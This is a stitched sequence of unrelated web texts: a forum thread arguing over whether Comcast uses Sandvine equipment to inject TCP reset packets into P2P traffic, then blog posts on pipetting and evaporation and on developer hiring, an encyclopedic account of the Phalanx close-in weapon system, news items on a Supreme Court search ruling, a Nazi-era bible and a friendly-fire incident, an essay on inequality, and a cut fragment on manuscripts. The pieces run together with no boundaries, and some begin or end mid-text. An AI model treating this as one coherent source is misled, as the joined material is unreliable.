You will not use or permit another to use the Comcast Equipment or the Service (s ) , directly or indirectly , for any unlawful purpose , including , but not limited to , in violation of any posted Comcast policy applicable to the Services .
Use of the Comcast Equipment or Services for transmission , communications or storage of any information , data or material in violation of any U.S. federal , state or local regulation or law is prohibited .
You acknowledge that you are accepting this Agreement on behalf of all persons who use the Comcast Equipment and / or Services and that you shall have sole responsibility for ensuring that all other users understand and comply with the terms and conditions of this Agreement and any applicable Comcast policies including , but not limited to , acceptable use and privacy policies .
You further acknowledge and agree that you shall be solely responsible for any transactions , including , without limitation , purchases made through or in connection with the Services .
You agree to indemnify , defend and hold harmless Comcast and its affiliates , suppliers , and agents against all claims and expenses ( including reasonable attorney fees ) arising out of the use of the Services , the Comcast Equipment and / or the Customer Equipment or the breach of this Agreement or any of the applicable Comcast policies by you or any other user . "
Now , they key point to the use of Sandvine , of which I have not confirmed due to lack of research ( I am lazy ) , is pointed out in Section 7 .
A P2P connection requires you to " authorize " someone else to use the service for a potentially unlawful purpose .
Not that any company wants to think that their customers are out to do wrong , but to physically track EVERY connection and monitor the connection 's contents would : a ) be an unlawful invasion of privacy , b) cost an enormous amount of money , c ) create an undesirable product as all costs would be passed on to the consumer ( even higher monthly charges ) and cause bandwidth availability to drop ( slower speeds ) .
Naturally , a company would seek to be proactive rather than reactive to a hot topic issue that is greatly influenced by one of their services , such as the use of P2P to violate copyrights or the proliferation of malicious software .
The end results are an improved corporate image , which from what I understand , is something that Comcast REALLY , REALLY needs any way they can get it , and to hinder all the responsible subscribers who use the service legally .
In " short " ( lol ) blame the idiots out there who force ISP 's to take this action or have them do you some " favors "

Sandvine said it has signed a contract with a Tier 1 U.S. service provider ...
Sandvine did not identify the company , but it said its new customer has over 5 million residential high - speed Internet subscribers .
Sandvine already counts top U.S. cable provider Comcast Corp among its customers , Barron 's said .

Once you have that , then this testing is not hard .
Set up Wireshark and start your P2P client .
Using Comcast , Sandvine will start sending TCP packets with the RST flag set .
Not using Comcast , you will see very few such packets .
No more or less than an Instant Messenger connection does .
All things have potentially unlawful purposes .
They are not , in and of themselves , unlawful .
Earlier in this same mentioned , you said that you had not researched this .
Had you looked into it , you would have found that this technology is available today and is for sale to ISPs .
The cost of the technology is offset by lower payments to backbone providers and the ability to delay expansions of capacity .
With somewhere around 75 % of all internet traffic being P2P , reducing that traffic that exits the network could provide substantial savings .
As for the invasion of privacy aspect , this is a grey area .
It may be one reason they have silently implemented Sandvine .
It is not good PR to peer into their customer 's packets for the purpose of deciding whether or not they will interfere with them .
I have already presented facts .
Regardless , unless you run your own tests , you 'll have to decide whether to take my word on it .
I 'm hoping that others will run their own tests .
If they do n't , I hope the facts that I 'm a qualified expert on the subject , posting under my own name , will carry some weight .
I doubt Comcast will let me in to look .
The evidence is circumstantial , but the amount is overwhelming .
And so did my packet size .
I have accounted for the latter with some other testing .
For the former , one should need a VPN endpoint that terminates within Comcast at some points other than Hillsboro , OR ..
Once you have that , then this testing is not hard .
Set up Wireshark and start your P2P client .
Using Comcast , Sandvine will start sending TCP packets with the RST flag set .
Not using Comcast , you will see very few such packets .

Now if only the Comcast network was as fast as their fanboys who quickly denounce any criticism of them .
The few times I 've used bittorrent transfers in the last few weeks I have noticed many disconnects on the up side .
I did n't know what was causing it , but your analysis makes sense now .
Now if only the Comcast network was as fast as their fanboys who quickly denounce any criticism of them .

Sandvine said it has signed a contract with a Tier 1 U.S. service provider to supply its 10 Gbps Policy Traffic Switch platform .
Comcast is not a Tier 1 provider .
In fact , the there are only two Tier 1's on that possible list , Vz and ATT .
My hunch is with ATT .
Your other article states :
" Sandvine Corp . ( SVC.TO : Quote , Profile , Research ) could see a boost in demand for their technologies , which could be used to give services such as Web video or voice priority over less urgent Internet traffic , according to Barron 's April 9 edition . " and then goes on to state " Sandvine already counts top U.S. cable provider Comcast Corp among its customers , Barron 's said . "

And we all know Comcast prioritizes its Voice packets .
None of which have anything to do with DE prioritizing torrent traffic .

I imagine a lot of P2P these days are popular CDs and Movies .
These being copyright violations aside , I 'm sure that for any given highly - popular file , enough sources exist within Comcast 's netblocks to fill any request quickly .
That 's smart .
I 'm sure that 's what they were thinking , too .
The problem is that not every file is so popular , the rare files ( and those most likely to be completely legal to share , BTW ) , are badly punished by this filter .
Glad I could help .
LOL , well I 'm mostly a fan - boy too .
I even think this Sandvine idea is well - intended , albeit misguided .

I 'm a little lost as to what you 're arguing , here .
Do you think Sandvine is not installed at Comcast ?
If Sandvine were not installed on Comcast , and the RST - flagged packets I received were coming from other networks , then the VPN statistics and the Comcast statistics would be similar .
They 're not .
They 're very different .
Then argue that point with Sandvine .
Read the linked article more closely .
You 'll find that they were the guys that mentioned Comcast in their ( rather silly ) PR release .

Then read what I posted more carefully , that news release is n't about Comcast .
It states their new subscriber is a tier 1 ISP , Comcast and TW are Tier 2 ISPs , that leaves you with Vz and ATT .
The other news release that mentions Comcast as an existing subscriber ( which pretty much every telcom equipment company falls under at some point ) does n't state anything about the service in which you are talking about .
While it 's all nice to speculate and try and stir stuff up , this is an internet help forum .
Maybe you want to also post this in the Comcast .
net forums to see if you get an actual answer from Comcast about it ?

The issue is you can't really have a great discussion over something that is 100 % speculated .
If it was known that Comcast actually uses this product , for the reasons stated in the op's thread , then I can see why it would be useful .
But at the current time , without more information it is n't very useful .
With my recommendation , you 'd at least get an answer from Comcast , and from there an actual , informed discussion of the subject could take place .
I stated that it was a help forum , and thank you for posting what I said in different words ( the ones it says at the top ) , informed " discussions " into things relating to Comcast 's HSI and CDV are helpful , ones filled with " he said , she said " are not .

You still have me lost .
What is your concern , again ?
I told you what the tests were , I told you what the results were .
It is observable !
Do you think that the forums at Comcast .
net is a placed to have an informed discussion about this ?
If you do , then I understand why I am lost .
Why on Earth would I discuss an issue that I want brought into the light on a Comcast - controlled forum ?
The users on those forums are not informed .
I 'm not asking whether Comcast is filtering -- it is a fact .
I 've demonstrated it , published my methods and my results , and you can reproduce it .
My objectives are this :
1 . To end the secrecy around this project
2 . To explain a phenomena that others users may be experiencing
That 's it .
I 'm not stirring anything up .
Facts and evidence have no agenda .
I 've added my opinion -- quite separately from the facts .
But , as the " stir machine " goes , my opinion on the matter is relatively tame .
Now , instead of repeating what you 've said , do you have anything to add ?

There are no facts posted .
Just because you believe it does not make it a fact .
Your articles contradict each other , and the other states nothing about the described product in question from this vendor .
I did not suggest having the discussion in that forum , I suggested asking for an answer in that forum as to whether or not they actually use it .
If they say they do , then sure you can actually have a discussion over it .

It would cost Comcast less to just block outbound port 25 than to spend a wad of money on monitoring hardware which , by my MTA logs , does n't seem to be working , anyway ; assuming that they are employing Sandvine boxes to monitor SMTP traffic .

I will say this however , the behavior of bittorrent on my end has changed within the last month .
It seems to take longer to get started and as I look at the list of peers right now it shows all peers I 'm connected were inbound connections .
That does n't prove anything ( it could just be that I 've had the torrent running long enough that new peers find me before I find them ) but I have noticed a bit of a difference .
If you look at what sandvine product can do it 's more than just detect outbound spam .
It appears to be more of a general purpose firewall that can do deep packet inspection and take action on what it finds , be that P2P use or outbound spam or a worm .

I am pretty sure that AFAIK , there is no such line under the law , just an ages old Internet tradition codified in the RFCs .
To the extent that the RFCs amount to anything akin to a code .
Probably in violation of one , or another RFC , but not of any law that I am aware of .
I am pretty sure that this service would not be offered if it was illegal to alter packets in transit .

Evaporation
I work for the Penn Genomics Institute , mostly doing software work , but the Institute is run by biologists and also does biology projects .
Last month I taught some perl classes for the four summer interns ; this month they are doing some lab work .
Since part of my job involves dealing with biologists , I thought this would be a good opportunity to get into the lab , and I got permission from Adam , the research scientist who was supervising the interns , to let me come along .
Since my knowledge of biology is practically nil , Adam was not entirely sure what to do with me while the interns prepared to grow yeasts or whatever it is that they are doing .
He set me up with a scale , a set of pipettes , and a beaker of water , with instructions to practice pipetting the water from the beaker onto the scale .
The pipettes came in three sizes .
Shown at right is the largest of the ones I used ; it can dispense liquid in quantities between 10 and 100 μl , with a precision of 0.1 μl .
I used each of the three pipettes in three settings , pipetting water in quantities ranging from 1 ml down to 5 μl .
I think the idea here is that I would be able to see if I was doing it right by watching the weight change on the scale , which had a display precision of 1 mg .
If I pipette 20 μl of water onto the scale , the measured weight should go up by just about 20 mg .
Sometimes it did n't .
For a while my technique was bad , and I did n't always pick up the exact right amount of water .
With the small pipette , which had a capacity range of 2 – 20 μl , you have to suck up the water slowly and carefully , or the pipette tip gets air bubbles in it , and does not pick up the full amount .
With a scale that measures in milligrams , you have a wait around for a while for the scale to settle down after you drop a few μl of water onto it , because the water bounces up and down and the last digit of the scale readout oscillates a bit .
Milligrams are much smaller than I had realized .
It turned out that it was pretty much impossible to see if I was picking up the full amount with the smallest pipette .
After measuring out some water , I would wait a few seconds for the scale display to stabilize .
But if I waited a little longer , it would tick down by a milligram .
After another twenty or thirty seconds it would tick down by another milligram .
This would continue indefinitely .
I thought about this quietly for a while , and realized that what I was seeing was the water evaporating from the scale pan .
The water I had in the scale pan had a very small surface area , only a few square centimeters .
But it was evaporating at a measurable rate , around 2 or 3 milligrams per minute .
So it was essentially impossible to measure out five pipette - fuls of 10 μl of water each and end up with 50 mg of water on the scale .
By the time I got it done , around 15 % of it would have evaporated .
The temperature here was around 27°C , with about 35 % relative humidity .
So nothing out of the ordinary .
I am used to the idea that if I leave a glass of water on the kitchen counter overnight , it will all be gone in the morning ; this was amply demonstrated to me in nursery school when I was about three years old .
But to actually see it happening as I watched was a new experience .
I had no idea evaporation was so speedy .

Close - in Weapon Systems ( CIWS - usually pronounced " see- whiz " ) are designed to engage anti-ship cruise missiles and fixed - wing aircraft at short range .
Phalanx is the most numerous CIWS in the world and has been exported to many other countries .
Like other close - in weapon systems , Phalanx provides ships with a terminal defense against anti-ship missiles that have penetrated other fleet defenses .
Phalanx is very much a self contained system requiring minimal deck space and wiring .
Unlike many other CIWS , which have separate , independent systems , Phalanx combines search , detection , threat evaluation , acquisition , track , firing , target destruction , kill assessment and cease fire into a single mounting .
A prototype unit was installed for evaluation purposes on USS King ( DLG - 10 ) in 1973 .
In 1975 another prototype was mounted on the hulked USS Alfred A. Cunningham ( DD - 752 ) while several different kinds of missiles were fired against it .
All of these missiles , including a Walleye , were destroyed before reaching the ship .
A pre-production Phalanx unit underwent operational tests and evaluation onboard USS Bigelow ( DD - 942 ) in 1977 .
These tests showed that the unit exceeded the required maintenance and reliability specifications .
The evaluations included tests with high levels of jamming noise during which the unit succeeded in distinguishing small missile - like targets against nearby islands .
Phalanx Block 0 production started in 1978 with orders for 23 USN and 14 Foreign Military Sales ( FMS ) systems .
Phalanx Block 1 saw service introduction in 1988 .
Block 1 baseline 0 upgrades included a larger magazine ( 1,500 rounds ) , a multiple pulse repetition frequency search radar , an expanded radar search envelope to counter diving targets as well as reliability and maintainability improvements .
Block 1 was also able to engage targets diving at steeper angles than Block 0 could handle .
Block 1 replaced the 2 - D scanning antenna of Block 0 with a four - plate back - to - back antenna that continuously searches from the horizon up to the vertical .
The cease - fire protocol was changed to match the burst length to the type of target being engaged , thus conserving ammunition and allowing a greater number of targets to be engaged .
In automatic control , the gun will prioritize the first six threats it sees at about 10,000 yards ( 9,100 m ) and engage at 4,000 yards ( 3,600 m ) .
Block 1 baseline 1 replaced the hydraulic gun drive with a pneumatic ( air - driven ) gun drive system that increased the rate of fire to 4,500 rounds per minute .
Search radar sensitivity was also improved in this upgrade .
Block 1 baseline 2 introduced further reliability upgrades along with a muzzle restraint to decrease dispersion .
As installed on multiple non-Aegis and Aegis ships , neither the original Phalanx Block 0 nor the subsequent Block 1 baseline 0 , 1 , or 2 upgrades were integrated with a ship self - defense system .
The Phalanx Block 1A incorporated a high - order language computer in order to better process engagement algorithms and provided improved performance against maneuvering targets .
Block 1A also provided for basic integration with the Ship Self Defense System and enabled RAM missile engagement through the Phalanx detection and track function .
Block 1B improvements include Optimized Gun Barrels ( OGB ) and a new integrated forward looking infrared system ( FLIR ) .
The OGB are electrically controlled , pneumatically driven and fire a new Enhanced Lethality Cartridge ( ELC ) .
The Phalanx FLIR provides increased capability to search , track and engage coastal warfare threats as well as provide better anti-ship missile defense .
Phalanx Block 1B saw service evaluation in 1999 aboard USS Underwood ( FFG - 36 ) and was first operationally installed on USS Taylor ( FFG - 50 ) in September 2000 .
As of February 2007 , about 900 Phalanx systems have been built and deployed in the navies of 22 nations .
More than 3 million rounds of ammunition have been manufactured specifically for these weapons .
In recent years , the Vulcan 20 mm gun that is the heart of this weapon has increasingly been seen as not being effective enough against modern missile threats .
However , the British Royal Navy did select Phalanx for their new Daring class Type 45 destroyers .
Phalanx is somewhat notorious for having maintenance problems , with the Navy 's Material Readiness Database for fiscal years 1997 through 1999 noting that Phalanx Block 1B ( all mods ) had an availability rate of between 72 and 81 % for this time period .
An interesting modification of Phalanx that recently entered service with the US Army is the Counter - Rocket Artillery Mortar system ( C - RAM ) , which is designed to combat the small mortar and rocket threat .
This system grew out of a 2004 request from Army Chief of Staff General Peter Schoomaker , who wanted a better means of defending US troops based in Iraq .
The complete C- RAM system networks a ground - based version of Phalanx together with the Army 's Lightweight Counter Mortar Radar ( LCMR ) and Q - 36 Target Acquisition Radar ( AN / TPQ - 36 Firefinder Radar ) , which detects incoming rounds and determines their point of origin .
When C - RAM detects an incoming round , it turns on a set of strobe lights to alert local personnel to take cover , authorizes the modified Phalanx to open fire with explosive bullets to destroy the projectile and dispatches a Hunter UAV equipped with Viper Strike laser - designated munitions to kill whoever fired it .
Raytheon is currently ( 2007 ) offering a trailer - mounted version of Phalanx as part of C - RAM under the product name of CenturionTM .
Unlike the naval version , the C - RAM version of Phalanx does not fire solid tungsten penetrators .
Instead , in order to reduce the risk of civilian and friendly casualties , this system uses self - destructing explosive bullets .
The first two C - RAM systems arrived in Iraq in May , 2005 and have been reported as having successfully knocked down incoming mortar rounds .
In September 2006 , it was reported that the Israeli military expressed an interest in this weapon as well as in Skyshield , the land version of the Millennium system .
Nomenclature Note : The Phalanx system is designated as the Mark 15 .
The CIWS mounting itself is designated as the Mark 72 .

Ban on illegal searches applies to car passengers , high court rules
2007-06-18 15:28:00 PDT
WASHINGTON -- Police who illegally stop a car can't hold the passengers for questioning and possible searches , the U.S. Supreme Court ruled today in a case from Northern California .
The unanimous decision said a passenger has the same right as a driver to argue in court that police had no legitimate reason for a traffic stop .
The California Supreme Court ruled in the same case last June that only the driver can challenge the legality of the stop .
If the U.S. Supreme Court had agreed , police who stopped vehicles illegally or at random could have detained any passengers for at least a brief period .
Police could have conducted a pat - down search if they had reason to believe a passenger was carrying a weapon , and they could have arrested a passenger if they saw incriminating evidence in the car .
That would have " increased the risk of racial profiling , " said Steven Shapiro , legal director of the American Civil Liberties Union .
The ACLU filed arguments on behalf of itself , the NAACP Legal Defense Fund and the Asian American Legal Defense and Education Fund .
The now - overturned California Supreme Court ruling " gave police a free pass to violate the Constitution as long as they focused their law enforcement efforts on the passenger rather than the driver , " Shapiro said .
" They could have stopped any car on the highway for no reason whatsoever as long as it had passengers as well a driver , " he said .
" If they found any evidence of a crime after an illegal stop , they could go ahead and prosecute the passenger without worrying about any Fourth Amendment claim " of an unconstitutional seizure .
Deputy Attorney General Cliff Zall , the state 's lawyer , said those fears were overblown .
" I think a policeman knows that if he stops a car unlawfully , any evidence can't be used against the driver , and ( the officer ) can be subject to a civil rights lawsuit , " Zall said .
Writing for the high court , Justice David Souter said in today 's ruling that " a traffic stop necessarily curtails the travel a passenger has chosen just as much as it halts the driver . "
Even when the apparent reason for the stop is a traffic violation , Souter said , a passenger will expect some police scrutiny , so that any attempt to leave " will be so obviously likely to prompt an objection by the officer that no passenger would feel free to leave in the first place . "
The case involved Bruce Brendlin , a passenger in a car that was stopped by a Sutter County sheriff 's deputy in Yuba City in November 2001 .
The officer initially said the car had an expired registration but later conceded there was no valid reason for the stop .
He recognized Brendlin as a parole violator , arrested him and later found drug paraphernalia in the car .
After a judge upheld the search , Brendlin pleaded guilty to drug possession and was sentenced to four years in prison .
He has already served his sentence , with credit for good behavior , and has completed his parole period , said his lawyer , Elizabeth Campbell .
Today 's ruling does not necessarily end the case .
Zall , the state 's lawyer , said he may still ask the California Supreme Court to rule that the search was legal because Brendlin had a warrant out for his arrest .
The case is Brendlin vs. California , 06 - 8120 .
The ruling is available at www.supremecourtus.gov/opinions/06pdf/06-8120.pdf.
Who needs good software developers anyway ?
August 7 , 2006
Posted by Imran Ghory in recruitment
One of the interesting replies to my previous post on developer recruitment was a claim that shocked many of my other readers – the essence is captured in the following quote : “ For most of the developers working in the industry , coding is about cut and paste “ .
Shocking maybe – but realistically it ’s true .
The majority of developers working today are working on fairly straight forward systems doing fairly simplistic things like tying up a gui to a database .
For the most parts that means you do n’t need to be a good software developer , broadly speaking it does n’t matter if you do n’t have an in - depth understanding of your programming language or lack a formal comp sci education .
However there is another world , a much more fun world in my opinion although others may disagree .
A world in which you need to have expertise in your language , where you really need to understand what exactly your code is doing and often how it ’s achieving it .
A world in which you need to be a good software developer to survive and get the job done .
I ’d argue that this world is fundamentally composed of two types of companies :
Those for whom their software is their competitive advantage
Those which have complex mission critical systems
The second type in some ways a subset of the first ; in that if those companies did n’t have good software developers not only would they lack competitive advantage , but that they would n’t even stand a chance in the market .
One easy way to identify who needs good software developers is to look at who ’s hiring good software developers .
And one way to do that is to look at their interviewing practices .
If a company gives a heavy technical drilling , expecting the candidate to write code , debug on paper , discuss algorithms then chances are that they want good software developers .
But because good software developers come at a premium it ’s a reasonable inference that a company which has a solid technical interview process actually needs good software developers .
If you ’re interviewing for a company that falls into one of the two types I ’ve mentioned above and they ’re not probing you technically , then I ’d suggest running away very very quickly .
Chances are they ’re not going to be around much longer ….
So who actually are these companies who need good software developers then ?
– well going on the earlier assumption that generally only companies that need good software developers would try to hire them : if we could find a list of companies that had tough technical interviews that would probably be a reasonable approximation .
Fortunately there are several such lists the most prominent of which is probably Gayle Laakmann ’s site on tech interviews .
Going through the companies on Laakmann ’s site they all nicely fit into the two fundamental types I mentioned above .
A lot of them are software companies either shrink - wrap ( Microsoft , Apple , etc. ) or software - as - a - service ( Amazon , Expedia ) in which the strength of their software is their primary market advantage – the benefit to them of good developers is obvious .
Some are defence firms ( Boeing ) or similar where robust and reliable mission critical systems does n’t give them competitive advantage but are a simple requirement if they want to operate in the market .
And some like the financial firms ( Goldman Sachs ) fall into both types – high - quality , reliable and efficient software is required to maintain advantage over your competitors .
When a few milliseconds delay in executing a trade can be the difference between profit and loss paying a small premium for the best developers is a no-brainer .
And on the complex system side you ca n’t have developers building sophisticated multi- threaded trading systems .
You really do need to have an in - depth understanding of issues such as synchronicity and floating point number implementations when you have literally billions of dollars at stake .
So when you next see someone commenting on developer recruitment , pause for a minute and consider which of the two worlds they come from .
If their opinion shocks you it may be because they do come from another world .
Metaphorically anyway .

An institute in Germany has unearthed a Nazi bible ordered by Adolf Hitler to replace the old and new testaments expunged of all references to Jews .
Hitler 's race theorists even rewrote the 10 commandments and added two more for good measure in the book called ’ German with God ’ which was – alongside Hitler ’ s autobiography – meant to be required reading in every home in his Third Reich .
Thou shalt not kill , coveting one 's neighbour 's wife , thou shalt not steal and all other others were scrapped by a regime that stole , murdered and plundered its way across the world .
Hitler admired the ceremony and majesty of the church – he admitted as much in Mein Kampf – but hated its teachings which had no place in his vision of Germanic supermen ruling lesser races devoid of ' outdated ' concepts such as mercy and love .
But he knew the power of the church in Germany and even he could not banish it overnight .
He was even forced to abandon the systematic murder of the handicapped and insane before the war when outspoken bishops began to speak against it .
Instead his plan was to gradually ' Nazify ' the church beginning with a theological centre he set up in 1939 to rewrite the Holy Bible .
He appointed lackey professors to work on a thoroughly Nazi version that would remove all references to Jews and all compassion .
Their brief : ' The cleanse church texts of all non-Ayran influences . '
The first to go were the 10 Commandments .
The Nazi 12 run :
" Honour God and believe in him wholeheartedly .
Seek out the peace of God .
Avoid all hypocrisy .
Holy is your health and life !
Holy is your wellbeing and honour !
Holy is your truth and fidelity !
Honour your father and mother – your children are your aid and your example .
Keep the blood pure and your honour holy !
Maintain and multiply the heritage of your forefathers .
Always be ready to help and to forgive .
Honour your Fuehrer and master !
Joyously serve the people with work and sacrifice .
That is what God wants from us ! "
More important for Hitler , however , was the eradication of Jewish words , including Hallelulja , Jehova and even Jerusalem – it was instead termed the ’ the eternal city of God . ’
" The book will have to serve the fight against the immortal Jewish enemy ! " said Hitler in a memorandum to the institute in Eisenach .
Hansjoerg Buss of the Nordelbischen Church Office discovered the Bible in an archive search .
It was printed in 1941 by a company in Weimar and was shipped out to thousands of churches across Nazi- occupied Europe .
It is understood most have been destroyed .
The name of the office Hitler created to shape the Bible in his image was the ' Institute for the research and removal of the Jewish influence on German church life . '
One of the major tasks was to ignore Jesus ’ Jewish roots and turn him into an Ayran .
Other words specifically banned by Hitler ’s race - haters were Zion , Hosanna , Galilee and Moses .
One order found in the archives for a special exhibition in Eisenach of the institute ’s bizarre work came from Walter Grundmann , the anti-Semitic director appointed by Hitler .
He wrote in 1941 : " The Bible must become Jew - free and the German people must see that the Jews are the mortal enemy who threaten their very existence . "
Hymn books were also trawled and ' Ayranised ' with no references to make the party elite balk during the few times they were ever likely to find themselves in a Christian church .
At its height , a team of 50 worked on re-writing hymn books and the Bible .
But it was all a charade as far as Hitler and his S.S .
chief Heinrich Himmler were concerned .
Both dreamed of being overlords of an essentially pagan society where the only virtues to be praised were iron hardness and a capability to obey any order , no matter what .
" Human kindess and the moral compass as set by the Bible were laughable to them , " said Ulrich Messner , a Nazi expert .
The King James Bible is a little under 800 pages in paperback form .
The Nazi ' Bible ' was 750 pages , after the references to Jews had been banished and Nazi " improvements " added .
A couple of weeks back , out in Omaha , I happened to share a ride to the airport with a pair of United pilots .
Both were classics of the type — trim , square - jawed , silver - haired , twangy - voiced white men , one wearing a leather jacket .
Sam Shepard or Paul Newman could ’ve played them .
They spent the entire trip sputtering and whining — about being baited and switched when their employee ownership of the airline had been evaporated by its bankruptcy , about the default of their pension plan , about their CEO ’s 40 percent pay raise , about the company to which they ’d devoted their whole careers and now did n’t trust a bit , and , in effect , about turning from right - stuff demigods who worked hard and played by the rules into disrespected , sputtering , whining losers .
The next morning back in New York , I read the news about the record - setting bonuses on Wall Street , an aggregate amount 1,100 percent higher than in the go - go year of 1986 .
The 2006 revenues at just one bank , Goldman Sachs , were larger than the GNPs of two - thirds of the countries on Earth — a treasure chest from which the firm was disbursing $ 53.4 million to its CEO and an average of $ 623,000 to everybody who works at the place .
Ordinarily , I would shrug and move on with New Yorkerly indifference — the pilots are still flying , their reduced pensions notwithstanding , and I would n’t trade my life for any banker ’s .
But I have n’t been able to stop thinking about my jump - cut visions of those defeated pilots and the megabonused Wall Street guys shopping for $ 15 million apartments .
And as a result , this holiday fortnight has felt to me fully Dickensian — the jolly bourgeois bustle and glow , as usual , but also in the foreground the conceited , unattractive rich , our Dombeys and Bounderbys and unredeemed Scrooges .
A month ago , I was ragging on CNN for presenting Lou Dobbs ’s hour of pissed - off populism as if it were a traditional nightly news show , and I still think it has a serious truth - in - packaging problem .
But ( like Dickens ’s Mr. Gradgrind , with his epiphany about the poor in Hard Times ) I now get Dobbs ’s and his followers ’ anger and disgust about the ongoing breaches of the social contract , an American economic system that seems more and more rigged in favor of the extremely fortunate .
I know capitalism is all about creative destruction , that the pain of globalization must be endured and flexible labor markets are good ; inequality is endemic ; life is uncertain and unfair , sure , yeah , of course .
We ’re all Reaganites now — or at least no longer socialists by instinct .
But during the past two decades we ’ve not only let economic uncertainty and unfairness grow to grotesque extremes , we ’ve also inured ourselves to the spectacle .
As America has become a lot more like Pottersville than Bedford Falls , those of us closer to the top of the heap have shrugged and moved on .
The asymmetry between the Goldman boss ’s compensation and that of his average employee — 85 times as big — is virtually Ben - and - Jerry ’s - like these days :
An average CEO now gets paid several hundred times the salary of his average worker , a gap that ’s an order of magnitude larger than it was in the seventies .
In Japan , the ratio is just 11 - to - 1 , and in Britain 22 - to - 1 .
This is not the America in which we grew up .
Back before the Second World War , in the teens and twenties , the richest one - half of one percent of Americans received 11 to 15 percent of all income , but from the fifties through the seventies , the income share of the superrich was reasonably cut back , by more than half .
The rich were still plenty rich , and American capitalism worked fine .
Starting in the late eighties , however , the piece of the income pie taken each year by the rich has once again become as hugely disproportionate as it was in the twenties .
Meanwhile , the median household income has gone up a measly 15 percent during the past quarter - century — and for the last five years it has actually dropped .
It used to be that when the economy thrived and productivity grew , pay for working people rose accordingly .
Yet as the Times reported this past summer , the first six years of the 21st century look to be “ the first sustained period of economic growth since World War II that fails to offer a prolonged increase in real wages for most workers . ”
People have put up with all this because it happened so quickly and for the same reason that the great mass of losers in casinos put up with odds that favor the house :
The spectacle of a few ecstatic big winners encourages the losers to believe that , hey , they might get lucky and win , too .
We have , in effect , turned the U.S. into a winner - take - all casino economy , substituting the gambling hall for the factory floor as our governing economic metaphor , an assembly of individual strangers whose fortunes depend overwhelmingly on random luck rather than collective hard work .
And it ’s been unwitting synergy , not unrelated coincidence , that actual casino gambling has become ubiquitous in America at the same time .
I do n’t know about you , but I find casinos , for all their adrenaline and glitz , pretty depressing places .
Risk - taking is fabulous , central to the American ethos — but not when it ’s involuntary .
Too many Americans have been too suddenly herded into our new national economic casino , and without debate turned into the suckers whose losses become the elite ’s winnings .
That ’s the central argument of Yale political scientist Jacob Hacker ’s valuable new book , The Great Risk Shift .
Beyond our recent reversion to extreme , twenties - style income inequality , he presents data explaining the new sense of economic dread hanging over Americans .
We all know that in this globalized , ultracompetitive age , job security has been beggared , but Hacker attaches startling numbers to the national anxiety .
In short , people ’s incomes are swinging wildly — like winnings in a casino .
In 1970 , a family in any given year had a one - in - fourteen chance of its income dropping by half ; today , the chance is one in six .
No wonder mortgage foreclosures and personal bankruptcies have quintupled during the same period .
Middle - class Americans live more and more with the kind of gnawing existential uncertainty that used to be mainly a problem of the poor .
The Great Society programs of the mid-sixties — Food Stamps , Head Start , Medicaid , Medicare — were the final flowering of a social - welfare era that began with FDR ’s New Deal 30 years earlier .
The countervailing rightward pendulum swing — deregulation and tax cuts under Reagan , welfare reform under Clinton , still more tax cuts under Bush — has dominated our political economy for nearly the past 30 years .
In other words , the time seems to be ripening for a transformative surge of new passion and policy and political traction around the idea of economic fairness .
Blaming illegal Mexican immigrants and dollar - an - hour Chinese workers for our troubles is an easy way to vent , but Lou Dobbs ’s other regular targets are pretty much on the mark : corporate greedheads and their craven enablers in the political class .
For more than a generation , the Republicans have pitched themselves as the good - old - days party , appealing to the nostalgic hunger for the wholesome , coherent society and culture of mid-century , before life went crazy around 1968 .
What the Democrats can do now is the same thing , only different — that is , appeal to the nostalgic hunger for the sense of basic economic security and fairness that prevailed before life went crazy around 1986 .
Just as Republicans depicted Democrats as insanely freewheeling social experimenters determined to lavish money on the undeserving poor , the caricature can be convincingly reversed :
Now the GOP is the party of arrogant , reckless risk - takers — invading Iraq , denying climate change , privatizing Social Security — determined to lavish money on the undeserving rich .
Populism has gotten a bad odor , and not just among plutocrats — for most of the political chattering class , it is at least faintly pejorative .
But I think that ’s about to change :
When economic hope shrivels and the rich become cartoons of swinish privilege , why should n’t the middle class become populists ?
What Professor Hacker calls “ office - park populism ” will be a main engine of any new cyclical progressive renaissance .
The question is whether we ’ll elect steady , visionary FDR - like national leaders — Bloomberg ?
Obama ?— who can manage to keep populism ’s nativist , Luddite tendencies in check .
I think practical - minded political majorities can be brought together to fix the big , important things that have nothing to do with religious faith or sex .
In polls , between 60 and 70 percent of people now think “ it is the responsibility of the federal government to make sure all Americans have health - care coverage ” “ even if taxes must be raised . ”
Universal health coverage , protecting everyone against the mammoth downside economic risk of illness , would empower people to take constructive economic risks , freeing them to move to new jobs or start new businesses .
We could enact de facto compensation caps for top executives , either by limiting the tax deductibility of CEO pay or , as in Britain , by making CEO pay subject to a shareholder vote every year .
We can raise — and certainly not further reduce — taxes on the extremely well - to - do .
We ’ve had a bracing , invigorating run of pedal - to - the - metal hypercapitalism , but now it ’s time to ease up and share the wealth some .
We can afford to make life a little more fair and a lot less scary for most people .
It ’s not only a matter of virtue and national self - image .
Because the future that frightens me is n’t so much a too - Hispanic U.S. caused by unchecked Mexican immigration , but a Latin Americanized society with a high - living , blithely callous oligarchy gated off from a growing mass of screwed - over peons .
I think we need to put up with the Republicans ’ complaining about “ class war ! ” now in order to avoid a real one later .

( CNN ) --
Three British soldiers were killed in a suspected " friendly fire " incident involving a bomb dropped from a U.S. fighter plane during a clash with Taliban militants in Afghanistan , military officials said Friday .
British troops pictured in action in Helmand province in March 2007 .
The three British troops died during an operation against the Taliban near Kajaki in the southwestern province of Helmand , the UK Ministry of Defense said in a statement .
It said air support from two U.S. F - 15 aircraft was called in during the clash .
" One bomb was dropped and it is believed the explosion killed the three soldiers , " the ministry said .
The deaths of the soldiers , who were serving under NATO command , brings to 73 the number of British troops killed in Afghanistan since the U.S. - led offensive of 2001 .
Many of those have died in a recent upsurge in Taliban activity in Helmand .
Watch how the deaths have reopened old wounds
Two other soldiers were wounded and air - lifted to a nearby base for medical treatment .
Meanwhile , two coalition soldiers died in a non-combat " vehicle rollover " accident in the western province of Herat early Friday , a coalition press center statement said .
Two other soldiers were also wounded in the accident , which the coalition said is under investigation .
The soldiers ' names and nationalities were not immediately released .
In another non-combat related incident , a French NATO soldier was killed in a traffic accident in the Afghan capital of Kabul on Thursday , the French Defense Ministry said .
The incident occurred in city 's Shakardara district , the ministry said .
He was part of a patrol in a light armored vehicle .
He was the 11th soldier from France to die in the Afghan conflict .

Or the manuscript for “ The Green Dwarf , ” a story that Charlotte Brontë wrote in minuscule lettering , to discourage adult eyes , and then made into a book for her siblings ?
Or the corrected proofs of “ Ulysses , ” on which James Joyce rewrote parts of the novel ?
The university insures the center ’s archival holdings , as a whole , for a billion dollars .
The current director of the center is Thomas Staley .
